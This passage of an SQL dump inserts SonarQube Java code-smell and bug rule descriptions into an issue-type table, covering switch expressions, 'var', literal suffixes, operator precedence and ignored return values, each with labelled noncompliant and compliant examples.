<p>Similarly, for Switch Statements and arrow labels, a <code>break</code> in a block is always redundant and should not be used. Furthermore, if the
resulting block contains only one statement, the curly braces of that block can also be omitted.</p>
<p>This rule reports an issue when a case of a Switch Expression contains a block with a single <code>yield</code> or when a Switch Statement contains
a block with a <code>break</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int i = switch (mode) {
  case "a" -&gt; {        // Noncompliant: Remove the redundant block and yield.
    yield 1;
  }
  default -&gt; {         // Noncompliant: Remove the redundant block and yield.
    yield 2;
  }
};

switch (mode) {
  case "a" -&gt; {        // Noncompliant: Remove the redundant block and break.
    result = 1;
    break;
  }
  default -&gt; {         // Noncompliant: Remove the redundant break.
    doSomethingElse();
    result = 2;
    break;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int i = switch (mode) {
  case "a" -&gt; 1;
  default -&gt; 2;
};

switch (mode) {
  case "a" -&gt; result = 1;
  default -&gt; {
   doSomethingElse();
   result = 2;
 }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://openjdk.java.net/jeps/361">JEP 361: Switch Expressions</a> </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S6208', 'Comma-separated labels should be used in Switch with colon case', 'sonarqube', 'Code Smell', '<p>In Java 14 there is a new way to write cases in Switch Statement and Expression when the same action should be performed for different cases.
Instead of declaring multiples branches with the same action, you can combine all of them in a single case group, separated with commas. It will
result in a more concise code and improved readability.</p>
<p>This rule reports an issue when multiple cases in a Switch can be grouped into a single comma-separated case.</p>
<h2>Noncompliant Code Example</h2>
<pre>
// Switch Expression
int i = switch (mode) {
  case "a":
  case "b":
    yield 1;
  default:
    yield 3;
};

// Switch Statement
switch (mode) {
  case "a":
  case "b":
    doSomething();
    break;
  default:
    doSomethingElse();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
// Switch Expression
int i = switch (mode) {
  case "a", "b":
    yield 1;
  default:
    yield 3;
};

// Switch Statement
switch (mode) {
  case "a", "b":
    doSomething();
    break;
  default:
    doSomethingElse();
}

// Or even better:
switch (mode) {
  case "a", "b" -&gt; doSomething();
  default -&gt; doSomethingElse();
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://openjdk.java.net/jeps/361">JEP 361: Switch Expressions</a> </li>
</ul>', 'java', 'READY', 'INFO', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S6212', 'Local-Variable Type Inference should be used', 'sonarqube', 'Code Smell', '<p>In Java 10 <a href="https://openjdk.java.net/jeps/286">Local-Variable Type Inference</a> was introduced. It allows you to omit the expected type of
a variable by declaring it with the <code>var</code> keyword. </p>
<p>While it is not always possible or cleaner to use this new way of declaring a variable, when the type on the left is the same as the one on the
right in an assignment, using the <code>var</code> will result in a more concise code.</p>
<p>This rule reports an issue when the expected type of the variable is the same as the returned type of assigned expression.</p>
<h2>Noncompliant Code Example</h2>
<pre>
MyClass myClass = new MyClass();
</pre>
<h2>Compliant Solution</h2>
<pre>
var myClass = new MyClass();
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://openjdk.java.net/jeps/286">JEP 286: Local-Variable Type Inference</a> </li>
</ul>', 'java', 'READY', 'INFO', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S6213', 'Restricted Identifiers should not be used as Identifiers', 'sonarqube', 'Code Smell', '<p>Even if it is technically possible, <a href="https://docs.oracle.com/javase/specs/jls/se16/html/jls-3.html#jls-3.8">Restricted Identifiers</a>
should not be used as identifiers. This is only possible for compatibility reasons, using it in Java code is confusing and should be avoided.</p>
<p>Note that this applies to any version of Java, including the one where these identifiers are not yet restricted, to avoid future confusion.</p>
<p>This rule reports an issue when restricted identifiers:</p>
<ul>
  <li> var </li>
  <li> yield </li>
  <li> record </li>
</ul>
<p>are used as identifiers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var var = "var"; // Noncompliant: compiles but this code is confusing
var = "what is this?";

int yield(int i) { // Noncompliant
  return switch (i) {
    case 1: yield(0); // This is a yield from switch expression, not a recursive call.
    default: yield(i-1);
  };
}

String record = "record"; // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
var myVariable = "var";

int minusOne(int i) {
  return switch (i) {
    case 1: yield(0);
    default: yield(i-1);
  };
}

String myRecord = "record";
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.oracle.com/javase/specs/jls/se16/html/jls-3.html#jls-3.8">JLS16, 3.8: Identifiers</a> </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S818', 'Literal suffixes should be upper case', 'sonarqube', 'Code Smell', '<p>Using upper case literal suffixes removes the potential ambiguity between "1" (digit 1) and "l" (letter el) for declaring literals.</p>
<h2>Noncompliant Code Example</h2>
<pre>
long long1 = 1l; // Noncompliant
float float1 = 1.0f; // Noncompliant
double double1 = 1.0d; // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
long long1 = 1L;
float float1 = 1.0F;
double double1 = 1.0D;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/cdYxBQ">CERT DCL16-C.</a> - Use "L," not "l," to indicate a long value </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/7DZGBQ">CERT, DCL50-J.</a> - Use visually distinct identifiers </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S864', 'Limited dependence should be placed on operator precedence', 'sonarqube', 'Code Smell', '<p>The rules of operator precedence are complicated and can lead to errors. For this reason, parentheses should be used for clarification in complex
statements. However, this does not mean that parentheses should be gratuitously added around every operation. </p>
<p>This rule raises issues when <code>&amp;&amp;</code> and <code>||</code> are used in combination, when assignment and equality or relational
operators are used in together in a condition, and for other operator combinations according to the following table:</p>
<table>
  <tbody>
    <tr>
      <td> </td>
      <td><code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>%</code></td>
      <td><code>&lt;&lt;</code>, <code>&gt;&gt;</code>, <code>&gt;&gt;&gt;</code></td>
      <td><code>&amp;</code></td>
      <td><code>^</code></td>
      <td> <code>|</code> </td>
    </tr>
    <tr>
      <td><code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>%</code></td>
      <td> </td>
      <td>x</td>
      <td>x</td>
      <td>x</td>
      <td>x</td>
    </tr>
    <tr>
      <td><code>&lt;&lt;</code>, <code>&gt;&gt;</code>, <code>&gt;&gt;&gt;</code></td>
      <td>x</td>
      <td> </td>
      <td>x</td>
      <td>x</td>
      <td>x</td>
    </tr>
    <tr>
      <td><code>&amp;</code></td>
      <td>x</td>
      <td>x</td>
      <td> </td>
      <td>x</td>
      <td>x</td>
    </tr>
    <tr>
      <td><code>^</code></td>
      <td>x</td>
      <td>x</td>
      <td>x</td>
      <td> </td>
      <td>x</td>
    </tr>
    <tr>
      <td> <code>|</code> </td>
      <td>x</td>
      <td>x</td>
      <td>x</td>
      <td>x</td>
      <td> </td>
    </tr>
  </tbody>
</table>
<p>This rule also raises an issue when the "true" or "false" expression of a ternary operator is not trivial and not wrapped inside parentheses.</p>
<h2>Noncompliant Code Example</h2>
<pre>
x = a + b - c;
x = a + 1 &lt;&lt; b;  // Noncompliant
y = a == b ? a * 2 : a + b;  // Noncompliant

if ( a &gt; b || c &lt; d || a == d) {...}
if ( a &gt; b &amp;&amp; c &lt; d || a == b) {...}  // Noncompliant
if (a = f(b,c) == 1) { ... } // Noncompliant; == evaluated first
</pre>
<h2>Compliant Solution</h2>
<pre>
x = a + b - c;
x = (a + 1) &lt;&lt; b;
y = a == b ? (a * 2) : (a + b);

if ( a &gt; b || c &lt; d || a == d) {...}
if ( (a &gt; b &amp;&amp; c &lt; d) || a == b) {...}
if ( (a = f(b,c)) == 1) { ... }
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/YdYxBQ">CERT, EXP00-C.</a> - Use parentheses for precedence of operation </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/ZzZGBQ">CERT, EXP53-J.</a> - Use parentheses for precedence of operation </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/783.html">MITRE, CWE-783</a> - Operator Precedence Logic Error </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S881', 'Increment (++) and decrement (--) operators should not be used in a method call or mixed with other operators in an expression', 'sonarqube', 'Code Smell', '<p>The use of increment and decrement operators in method calls or in combination with other arithmetic operators is not recommended, because:</p>
<ul>
  <li> It can significantly impair the readability of the code. </li>
  <li> It introduces additional side effects into a statement, with the potential for undefined behavior. </li>
  <li> It is safer to use these operators in isolation from any other arithmetic operators. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
u8a = ++u8b + u8c--;
foo = bar++ / 4;
</pre>
<h2>Compliant Solution</h2>
<p>The following sequence is clearer and therefore safer:</p>
<pre>
++u8b;
u8a = u8b + u8c;
u8c--;
foo = bar / 4;
bar++;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/StYxBQ">CERT, EXP30-C.</a> - Do not depend on the order of evaluation for side effects </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/IXw-BQ">CERT, EXP50-CPP.</a> - Do not depend on the order of evaluation for side effects </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/NDdGBQ">CERT, EXP05-J.</a> - Do not follow a write by a subsequent write or read of the same
  object within an expression </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S888', 'Equality operators should not be used in "for" loop termination conditions', 'sonarqube', 'Code Smell', '<p>Testing <code>for</code> loop termination using an equality operator (<code>==</code> and <code>!=</code>) is dangerous, because it could set up an
infinite loop. Using a broader relational operator instead casts a wider net, and makes it harder (but not impossible) to accidentally write an
infinite loop.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (int i = 1; i != 10; i += 2)  // Noncompliant. Infinite; i goes from 9 straight to 11.
{
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (int i = 1; i &lt;= 10; i += 2)  // Compliant
{
  //...
}
</pre>
<h2>Exceptions</h2>
<p>Equality operators are ignored if the loop counter is not modified within the body of the loop and either:</p>
<ul>
  <li> starts below the ending value and is incremented by 1 on each iteration. </li>
  <li> starts above the ending value and is decremented by 1 on each iteration. </li>
</ul>
<p>Equality operators are also ignored when the test is against <code>null</code>.</p>
<pre>
for (int i = 0; arr[i] != null; i++) {
  // ...
}

for (int i = 0; (item = arr[i]) != null; i++) {
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/835">MITRE, CWE-835</a> - Loop with Unreachable Exit Condition (''Infinite Loop'') </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/x9YxBQ">CERT, MSC21-C.</a> - Use robust loop termination conditions </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S899', 'Return values should not be ignored when they contain the operation status code', 'sonarqube', 'Bug', '<p>When the return value of a function call contain the operation status code, this value should be tested to make sure the operation completed
successfully.</p>
<p>This rule raises an issue when the return values of the following are ignored:</p>
<ul>
  <li> <code>java.io.File</code> operations that return a status code (except <code>mkdirs</code>) </li>
  <li> <code>Iterator.hasNext()</code> </li>
  <li> <code>Enumeration.hasMoreElements()</code> </li>
  <li> <code>Lock.tryLock()</code> </li>
  <li> non-void <code>Condition.await*</code> methods </li>
  <li> <code>CountDownLatch.await(long, TimeUnit)</code> </li>
  <li> <code>Semaphore.tryAcquire</code> </li>
  <li> <code>BlockingQueue</code>: <code>offer</code>, <code>remove</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomething(File file, Lock lock) {
  file.delete();  // Noncompliant
  // ...
  lock.tryLock(); // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething(File file, Lock lock) {
  if (!lock.tryLock()) {
    // lock failed; take appropriate action
  }
  if (!file.delete()) {
    // file delete failed; take appropriate action
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/xzdGBQ">CERT, EXP00-J.</a> - Do not ignore values returned by methods </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/TTZGBQ">CERT, FIO02-J.</a> - Detect and handle file-related errors </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/754">MITRE, CWE-754</a> - Improper Check for Unusual Exceptional Conditions </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S923', 'Functions should not be defined with a variable number of arguments', 'sonarqube', 'Code Smell', '<p>As stated per effective java : </p>
<blockquote>
  <p>Varargs methods are a convenient way to define methods that require a variable number of arguments, but they should not be overused. They can
  produce confusing results if used inappropriately.</p>
</blockquote>
<h2>Noncompliant Code Example</h2>
<pre>
void fun ( String... strings )	// Noncompliant
{
  // ...
}
</pre>', 'java', 'READY', 'INFO', 'BLOCK');

